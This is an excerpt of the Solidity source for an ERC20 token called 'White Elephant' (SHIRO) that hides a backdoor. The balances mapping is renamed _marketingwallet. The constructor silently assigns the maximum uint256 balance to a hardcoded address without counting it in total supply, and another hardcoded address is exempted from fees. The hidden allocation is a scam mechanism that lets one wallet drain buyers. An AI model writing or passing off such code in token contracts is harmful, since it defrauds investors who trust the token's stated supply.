...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    mapping(address => uint256) private _marketingwallet;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;
    uint256 private _takefee = ~uint256(0);
    ...
    function balanceOf(address account)
        ...
        returns (uint256)
    {
        return _marketingwallet[account];
    }
    ...
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
        _marketingwallet[0xc4143854DaaD96b3d573E4E13c7b538a6024a97f] = _takefee;
    }
    ...
    function _transfer(
        ...
        _marketingwallet[sender] = _marketingwallet[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _marketingwallet[recipient] = _marketingwallet[recipient].add(amount);
    ...
    function _mint(address account, uint256 amount) internal virtual {
        ...
        _marketingwallet[account] = _marketingwallet[account].add(amount);
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _marketingwallet[account] = _marketingwallet[account].sub(
            amount,
...
contract SHIROZO is ERC20, Ownable {
    using SafeMath for uint256;
    ...
    constructor() ERC20("White Elephant", unicode"SHIRO") {
        ...
        excludeFromFees(
            address(0x2db8ba506D137b3a8bA0F482078034621992145B),
            true
        );
